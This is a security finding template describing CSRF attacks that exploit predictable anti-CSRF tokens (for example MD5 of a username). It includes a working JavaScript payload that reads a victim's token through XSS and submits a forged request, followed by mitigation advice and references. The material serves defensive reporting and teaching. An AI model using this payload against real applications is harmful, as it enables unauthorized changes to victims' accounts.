# CSRF - CSRF with Weak Token Bypass

**Title:** CSRF with Weak/Predictable Token Bypass

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

**Vulnerability Type:** Cross-Site Request Forgery

**Target:** State-changing endpoints with weak anti-CSRF tokens (e.g. derived from username)

## Impact

Unauthorized changes to user accounts or settings, including privilege escalation and data modification, even when tokens are present but weak.

## Description

Anti-CSRF tokens are predictable (e.g. MD5 of username) or can be stolen via reflected values/XSS, allowing forged requests with valid tokens.

## Steps to Reproduce

### Exploiting Weak CSRF Tokens

If tokens are derived from usernames or predictable values, precompute them (e.g., MD5 of username).

Example POC page that opens a window to refresh the token and then submits a forged request with the computed value.

### POST-Based with Token Theft (XSS + CSRF chaining)

When anti-CSRF tokens are present:

- Use reflected values or XSS to read the token from a page the victim visits.

Example chaining:

```javascript
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
```

## Recommendation

Use synchronizer tokens that are unique per session, cryptographically secure, and validated on every state-changing request. Tie tokens to the specific user/session.

## References

- OWASP CSRF Prevention Cheat Sheet
- PortSwigger CSRF labs
